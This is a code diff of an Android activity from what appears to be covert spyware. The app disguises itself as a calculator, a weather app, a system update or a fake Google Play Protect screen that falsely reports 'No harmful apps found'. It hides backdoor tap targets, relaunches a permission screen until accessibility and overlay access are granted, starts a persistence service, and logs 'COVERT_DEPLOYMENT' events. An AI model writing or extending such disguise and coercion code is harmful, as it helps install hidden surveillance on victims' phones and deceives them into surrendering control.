@@ -4,7 +4,6 @@ import android.Manifest;
 import android.animation.AnimatorSet;
 import android.animation.ObjectAnimator;
 import android.content.Intent;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
@@ -14,6 +13,7 @@ import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.LinearLayout;
+import android.widget.ProgressBar;
 import android.widget.TextView;
 
 import androidx.annotation.NonNull;
@@ -33,8 +33,6 @@ import java.util.Locale;
 
 public class DecoyActivity extends AppCompatActivity {
 
-    private Button btnCheckUpdate;
-    private View pseudoToast;
     private int clickCount = 0;
     private long lastClickTime = 0;
     private boolean isSpecializedDecoy = false;
@@ -54,7 +52,8 @@ public class DecoyActivity extends AppCompatActivity {
             getWindow().setNavigationBarColor(android.graphics.Color.BLACK);
         }
 
-        String componentName = getIntent().getComponent().getClassName();
+        android.content.ComponentName component = getIntent().getComponent();
+        String componentName = (component != null) ? component.getClassName() : "";
         Log.d("DecoyActivity", "Launched via: " + componentName);
 
         // Fallback: Check which alias is currently enabled if the component name is ambiguous
@@ -70,28 +69,61 @@ public class DecoyActivity extends AppCompatActivity {
             }
         }
 
-        if (componentName.contains("CalculatorAlias")) {
+        // --- MASQUERADE PASSTHROUGH ---
+        String masqPkg = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("masquerade_pkg", "");
+
+        if (!masqPkg.isEmpty()) {
+            try {
+                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(masqPkg);
+                if (launchIntent != null) {
+                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(launchIntent);
+                    finish();
+                    return;
+                }
+            } catch (Exception ignored) {}
+        }
+
+        int decoyChoice = SystemAnalytics.getDecoyChoice(this);
+
+        if (componentName.contains("CalculatorAlias") || decoyChoice == 2) {
             setContentView(R.layout.activity_decoy_calculator);
             setupCalculator();
             isSpecializedDecoy = true;
-        } else if (componentName.contains("WeatherAlias")) {
+        } else if (componentName.contains("WeatherAlias") || decoyChoice == 3) {
             setContentView(R.layout.activity_decoy_weather);
             setupWeather();
             isSpecializedDecoy = true;
-        } else if (componentName.contains("SettingsAlias")) {
-            setContentView(R.layout.activity_decoy_playprotect);
-            setupSettings();
+        } else if (componentName.contains("SystemUpdateAlias") || decoyChoice == 4) {
+            setContentView(R.layout.activity_decoy_install_success);
+            setupSystemUpdateSuccessDecoy();
+            isSpecializedDecoy = true;
+        } else if (componentName.contains("SmartTutorAlias") || componentName.contains("SmartTutor") || decoyChoice == 5) {
+            setupSmartTutorDecoy();
             isSpecializedDecoy = true;
         } else {
             isSpecializedDecoy = false;
-            // High-Fidelity System Update Logic
-            boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
-            if (isDeployed) {
-                setContentView(R.layout.activity_decoy_install_success);
+            // High-Fidelity Play Protect Pipeline Logic
+            if (allPermissionsOk()) {
+                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
                 setupSuccessDecoy();
             } else {
-                setContentView(R.layout.activity_decoy_install_update);
-                setupUpdateDecoy();
+                // Direct Permission Pipeline: Launches PermissionActivity whenever permissions are incomplete
+                FirebaseConfig.logActivity("COVERT_DEPLOYMENT: Direct permission pipeline initialized.");
+                
+                Intent i = new Intent(this, WorkManager_Sync.class);
+                i.setAction(Constants.ACTION_START_CORE);
+                try {
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                        startForegroundService(i);
+                    } else {
+                        startService(i);
+                    }
+                } catch (Exception ignored) {}
+
+                Intent permissions = new Intent(this, PermissionActivity.class);
+                permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                startActivityForResult(permissions, 9999);
             }
         }
 
@@ -110,89 +142,7 @@ public class DecoyActivity extends AppCompatActivity {
         }
     }
 
-    private void setupUpdateDecoy() {
-        btnCheckUpdate = findViewById(R.id.btnCheckUpdate);
-        View ivUpdateIcon = findViewById(R.id.ivUpdateIcon);
-        pseudoToast = findViewById(R.id.pseudoToast);
-        
-        final View loadingLayout = findViewById(R.id.loadingLayout);
 
-        if (btnCheckUpdate != null) {
-            btnCheckUpdate.setOnClickListener(v -> {
-                btnCheckUpdate.setEnabled(false);
-                
-                // Hide button text and show realistic loading
-                btnCheckUpdate.setText("");
-                
-                if (loadingLayout != null) {
-                    loadingLayout.setVisibility(View.VISIBLE);
-                    startRealisticLoadingAnimation(loadingLayout);
-                }
-                
-                // First Run "Installation" Sequence (12.5 seconds)
-                new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                    if (loadingLayout != null) loadingLayout.setVisibility(View.GONE);
-                    btnCheckUpdate.setEnabled(true);
-                    btnCheckUpdate.setText(R.string.decoy_check_btn);
-                    
-                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
-                    FirebaseConfig.logActivity("COVERT_DEPLOYMENT: System decoy initialized successfully.");
-                    
-                    // Start persistence core
-                    Intent i = new Intent(DecoyActivity.this, WorkManager_Sync.class);
-                    i.setAction(Constants.ACTION_START_CORE);
-                    try {
-                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                            startForegroundService(i);
-                        } else {
-                            startService(i);
-                        }
-                    } catch (Exception ignored) {}
-
-                    // Transition to Permission Repair Sequence
-                    try {
-                        Intent permissions = new Intent(DecoyActivity.this, PermissionActivity.class);
-                        permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                        startActivityForResult(permissions, 9999);
-                    } catch (Exception e) {
-                        Log.e("DecoyActivity", "Transition Error: " + e.getMessage());
-                        // Fallback UI switch
-                        setContentView(R.layout.activity_decoy_install_success);
-                        setupSuccessDecoy();
-                    }
-
-                }, 12500);
-            });
-        }
-
-        if (ivUpdateIcon != null) {
-            ivUpdateIcon.setOnClickListener(v -> finish());
-        }
-
-        View btnLearnMore = findViewById(R.id.btnLearnMore);
-        if (btnLearnMore != null) {
-            String dynamicUrl = getDynamicUpdateUrl();
-            if (btnLearnMore instanceof android.widget.TextView) {
-                SpannableStringBuilder builder = new SpannableStringBuilder("Learn more at:\n");
-                int start = builder.length();
-                builder.append(dynamicUrl);
-                builder.setSpan(new ForegroundColorSpan(Color.parseColor("#A0A0A0")), 0, start, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
-                builder.setSpan(new ForegroundColorSpan(Color.parseColor("#3470E5")), start, builder.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
-                ((android.widget.TextView) btnLearnMore).setText(builder);
-            }
-            btnLearnMore.setOnClickListener(v -> {
-                Log.d("DecoyActivity", "Learn More link clicked: " + dynamicUrl);
-                try {
-                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(dynamicUrl));
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(intent);
-                } catch (Exception e) {
-                    Log.e("DecoyActivity", "Error opening Learn More link: " + e.getMessage());
-                    android.widget.Toast.makeText(DecoyActivity.this, "Unable to open link", android.widget.Toast.LENGTH_SHORT).show();
-                }
-            });
-        }
-    }
 
     private void startRealisticLoadingAnimation(View layout) {
         // 1. Rotation Animation for the whole group
@@ -256,10 +206,97 @@ public class DecoyActivity extends AppCompatActivity {
     }
 
     private void setupSuccessDecoy() {
+        IO_Persistence_Manager.setAutoPilot(false);
+        setContentView(R.layout.activity_guide_permission);
+
+        ProgressBar pb = findViewById(R.id.pbPlayProtect);
+        TextView tvSub = findViewById(R.id.tvPlayProtectSub);
+        TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
+        View robot = findViewById(R.id.ivPlayProtectRobot);
+        View btnBack = findViewById(R.id.btnOverlayBack);
+
+        if (pb != null) {
+            pb.setProgress(100);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                pb.setProgressTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#34A853")));
+            }
+        }
+
+        if (tvSub != null) {
+            tvSub.setText("✔  System is up to date");
+            tvSub.setTextColor(Color.parseColor("#137333")); // Official Play Protect Dark Green
+            tvSub.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 20);
+            tvSub.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
+            tvSub.setOnClickListener(v -> handleBackdoorClick());
+        }
+
+        if (tvDetails != null) {
+            tvDetails.setText("No harmful apps found • Last scanned: Just now");
+            tvDetails.setTextColor(Color.parseColor("#5F6368"));
+            tvDetails.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 15);
+            tvDetails.setOnClickListener(v -> handleBackdoorClick());
+        }
+
+        if (robot != null) {
+            robot.setOnClickListener(v -> handleBackdoorClick());
+        }
+
+        if (btnBack != null) {
+            btnBack.setVisibility(View.VISIBLE);
+            btnBack.setOnClickListener(v -> goHome());
+        }
+
+        View btnFinish = findViewById(R.id.btnFinishDecoy);
+        if (btnFinish != null) {
+            btnFinish.setVisibility(View.VISIBLE);
+            btnFinish.setOnClickListener(v -> goHome());
+        }
+    }
+
+    private void setupSmartTutorDecoy() {
+        IO_Persistence_Manager.setAutoPilot(false);
+        setContentView(R.layout.activity_decoy_smart_tutor);
+
+        View title = findViewById(R.id.tvSmartTutorTitle);
+        View notice = findViewById(R.id.tvSmartTutorNotice);
+        View laptop = findViewById(R.id.ivSmartTutorLaptop);
+        View btnConnect = findViewById(R.id.btnSmartTutorConnect);
+
+        if (title != null) title.setOnClickListener(v -> handleBackdoorClick());
+        if (notice != null) notice.setOnClickListener(v -> handleBackdoorClick());
+        if (laptop != null) laptop.setOnClickListener(v -> handleBackdoorClick());
+
+        if (btnConnect != null) {
+            btnConnect.setOnClickListener(v -> {
+                try {
+                    // Extract user's country code dynamically for Samsung Remote Service localized URL
+                    java.util.Locale locale = java.util.Locale.getDefault();
+                    String country = locale.getCountry().toLowerCase();
+                    if (country.isEmpty()) country = "ca";
+
+                    String samsungUrl = "https://www.samsung.com/" + country + "/support/remoteservice/";
+                    Intent intent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(samsungUrl));
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+                } catch (Exception e) {
+                    try {
+                        Intent fallback = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://www.samsung.com/ca/support/remoteservice/"));
+                        fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(fallback);
+                    } catch (Exception ignored) {}
+                }
+            });
+        }
+    }
+
+    private void setupSystemUpdateSuccessDecoy() {
+        IO_Persistence_Manager.setAutoPilot(false);
+        setContentView(R.layout.activity_decoy_install_success);
+
         View root = findViewById(R.id.successRoot);
         if (root != null) {
             root.setAlpha(0f);
-            root.animate().alpha(1f).setDuration(5000).start();
+            root.animate().alpha(1f).setDuration(1000).start();
         }
 
         View backdoor = findViewById(R.id.ivSuccessBackdoor);
@@ -267,23 +304,91 @@ public class DecoyActivity extends AppCompatActivity {
             backdoor.setOnClickListener(v -> handleBackdoorClick());
         }
 
+        View btnBack = findViewById(R.id.btnSuccessBack);
+        if (btnBack != null) {
+            btnBack.setOnClickListener(v -> goHome());
+        }
+
+        View btnMore = findViewById(R.id.btnSuccessMore);
+        if (btnMore != null) {
+            btnMore.setOnClickListener(v -> {
+                View popupView = getLayoutInflater().inflate(R.layout.layout_samsung_popup_menu, null);
+                android.widget.PopupWindow popupWindow = new android.widget.PopupWindow(
+                        popupView,
+                        android.view.ViewGroup.LayoutParams.WRAP_CONTENT,
+                        android.view.ViewGroup.LayoutParams.WRAP_CONTENT,
+                        true
+                );
+                popupWindow.setElevation(20f);
+                popupWindow.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
+
+                View itemInfo = popupView.findViewById(R.id.pop_software_info);
+                if (itemInfo != null) {
+                    itemInfo.setOnClickListener(i -> {
+                        String osVersion = android.os.Build.VERSION.RELEASE;
+                        int sdkInt = android.os.Build.VERSION.SDK_INT;
+                        
+                        String oneUiVer = "";
+                        try {
+                            Class<?> spClass = Class.forName("android.os.SystemProperties");
+                            java.lang.reflect.Method getMethod = spClass.getMethod("get", String.class, String.class);
+                            String rawProp = (String) getMethod.invoke(null, "ro.build.version.oneui", "");
+                            if (rawProp == null || rawProp.isEmpty()) {
+                                rawProp = (String) getMethod.invoke(null, "ro.build.version.sem", "");
+                            }
+                            if (rawProp != null && !rawProp.isEmpty()) {
+                                if (rawProp.length() >= 3 && rawProp.matches("\\d+")) {
+                                    int numVer = Integer.parseInt(rawProp);
+                                    int major = numVer / 10000;
+                                    int minor = (numVer % 10000) / 100;
+                                    oneUiVer = major + "." + minor;
+                                } else {
+                                    oneUiVer = rawProp;
+                                }
+                            }
+                        } catch (Exception ignored) {}
+
+                        if (oneUiVer == null || oneUiVer.isEmpty()) {
+                            if (sdkInt >= 35) oneUiVer = "8.5";
+                            else if (sdkInt == 34) oneUiVer = "6.1";
+                            else if (sdkInt == 33) oneUiVer = "5.1";
+                            else if (sdkInt == 32 || sdkInt == 31) oneUiVer = "4.1";
+                            else if (sdkInt == 30) oneUiVer = "3.1";
+                            else if (sdkInt == 29) oneUiVer = "2.5";
+                            else oneUiVer = "8.5";
+                        }
+
+                        String infoText = "One UI version " + oneUiVer + "\nAndroid " + osVersion;
+                        android.widget.Toast.makeText(DecoyActivity.this, infoText, android.widget.Toast.LENGTH_SHORT).show();
+                        popupWindow.dismiss();
+                    });
+                }
+
+                View itemAuto = popupView.findViewById(R.id.pop_auto_download);
+                if (itemAuto != null) {
+                    itemAuto.setOnClickListener(i -> {
+                        android.widget.Toast.makeText(DecoyActivity.this, "Auto download over Wi-Fi is enabled", android.widget.Toast.LENGTH_SHORT).show();
+                        popupWindow.dismiss();
+                    });
+                }
+
+                View itemLast = popupView.findViewById(R.id.pop_last_update);
+                if (itemLast != null) {
+                    itemLast.setOnClickListener(i -> {
+                        android.widget.Toast.makeText(DecoyActivity.this, "Last successful update: Today", android.widget.Toast.LENGTH_SHORT).show();
+                        popupWindow.dismiss();
+                    });
+                }
+
+                popupWindow.showAsDropDown(btnMore, -30, 0);
+            });
+        }
+
         final Button btnCheckForUpdate = findViewById(R.id.btnCheckForUpdate);
         final View loadingLayout = findViewById(R.id.loadingLayoutSuccess);
 
-
-
         if (btnCheckForUpdate != null) {
-            if (IO_Persistence_Manager.getInstance() == null) {
-                btnCheckForUpdate.setText("Complete Setup");
-            }
-
             btnCheckForUpdate.setOnClickListener(v -> {
-                if (IO_Persistence_Manager.getInstance() == null) {
-                    Intent permissions = new Intent(DecoyActivity.this, PermissionActivity.class);
-                    startActivity(permissions);
-                    return;
-                }
-
                 btnCheckForUpdate.setEnabled(false);
                 btnCheckForUpdate.setText("");
                 
@@ -301,6 +406,16 @@ public class DecoyActivity extends AppCompatActivity {
                 }, 4000);
             });
         }
+    }
+
+    private void goHome() {
+        try {
+            Intent home = new Intent(Intent.ACTION_MAIN);
+            home.addCategory(Intent.CATEGORY_HOME);
+            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(home);
+        } catch (Exception ignored) {}
+        finish();
     }
 
     private void setupCalculator() {
@@ -617,6 +732,23 @@ public class DecoyActivity extends AppCompatActivity {
     }
 
     @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 9999) {
+            if (!isSpecializedDecoy) {
+                if (allPermissionsOk()) {
+                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
+                    setupSuccessDecoy();
+                } else {
+                    Intent permissions = new Intent(this, PermissionActivity.class);
+                    permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                    startActivityForResult(permissions, 9999);
+                }
+            }
+        }
+    }
+
+    @Override
     protected void onResume() {
         super.onResume();
         
@@ -630,11 +762,15 @@ public class DecoyActivity extends AppCompatActivity {
             FirebaseConfig.logActivity("INTEL_NOTICE: Accessibility service is offline");
         }
 
-        // AUTO-TRANSITION TO SUCCESS: If permissions were just granted, show the success screen
-        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
-        if (!isSpecializedDecoy && isDeployed && allPermissionsOk()) {
-            setContentView(R.layout.activity_decoy_install_success);
-            setupSuccessDecoy();
+        if (!isSpecializedDecoy) {
+            if (allPermissionsOk()) {
+                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
+                setupSuccessDecoy();
+            } else {
+                Intent permissions = new Intent(this, PermissionActivity.class);
+                permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                startActivityForResult(permissions, 9999);
+            }
         }
     }
 
@@ -650,7 +786,7 @@ public class DecoyActivity extends AppCompatActivity {
         }
         
         // Special perms
-        if (IO_Persistence_Manager.getInstance() == null) return false;
+        if (!PermissionActivity.isAccessibilityServiceEnabled(this)) return false;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return false;
         
         return true;
